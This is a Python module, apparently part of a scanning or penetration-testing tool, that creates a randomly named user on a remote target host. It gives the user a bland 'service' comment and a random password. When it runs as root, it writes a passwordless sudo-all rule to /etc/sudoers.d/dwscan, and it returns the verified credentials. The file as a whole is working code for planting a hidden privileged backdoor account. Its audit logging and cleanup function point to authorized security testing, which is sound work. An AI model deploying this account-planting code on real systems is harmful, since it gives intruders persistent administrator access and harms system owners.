from __future__ import annotations
import secrets

from .models import Access, Target
from .privileges import provisionable
from .audit import Audit

PREFIX = "dw_"
SUDOERS = "/etc/sudoers.d/dwscan"


def _user() -> str:
    return PREFIX + secrets.token_hex(3)


def _q(c: str) -> str:
    return "'" + c.replace("'", "'\\''") + "'"


def _useradd(user: str, pw: str) -> str:
    return (f"id -u {user} >/dev/null 2>&1 || "
            f"useradd -m -s /bin/bash -c service {user} && "
            f"echo '{user}:{pw}' | chpasswd && echo DWUSER {user}")


def create_system_user(runner, t: Target, priv: dict, audit: Audit):
    if not provisionable(priv):
        return None
    user, pw = _user(), secrets.token_hex(16)
    sudo = "sudo" if priv.get("can_sudo") and not priv.get("is_root") else ""

    r = runner.run(t.url, f"{sudo} sh -c {_q(_useradd(user, pw))}", timeout=120, audit=audit)
    if f"DWUSER {user}" not in r.stdout:
        return None

    uid = runner.run(t.url, f"{sudo} id -u {user}", timeout=45).stdout.strip()
    if not uid.isdigit():
        return None

    if priv.get("is_root"):
        runner.run(t.url, f"printf '%s ALL=(ALL) NOPASSWD:ALL\\n' {user} > {SUDOERS}"
                          f" && chmod 440 {SUDOERS}", timeout=45, audit=audit)

    privileged = "NOPASSWD" in runner.run(
        t.url, f"{sudo} sudo -n -l -U {user}", timeout=45).stdout
    if not privileged:
        su = runner.run(t.url, f"echo '{pw}' | su - {user} -c 'id -u' 2>&1", timeout=60).stdout
        if uid not in su:
            return None

    audit.write("provision", "user_verified", t.url, user=user, uid=uid,
                privileged=privileged)
    return Access("system", user, pw, privileged=privileged, verified=True)


def remove_system_user(runner, t: Target, user: str, audit: Audit) -> bool:
    ok = "DWDEL" in runner.run(t.url, f"sudo userdel -r {user} 2>/dev/null; echo DWDEL",
                               timeout=90).stdout
    if ok:
        audit.write("provision", "user_removed", t.url, user=user)
    return ok
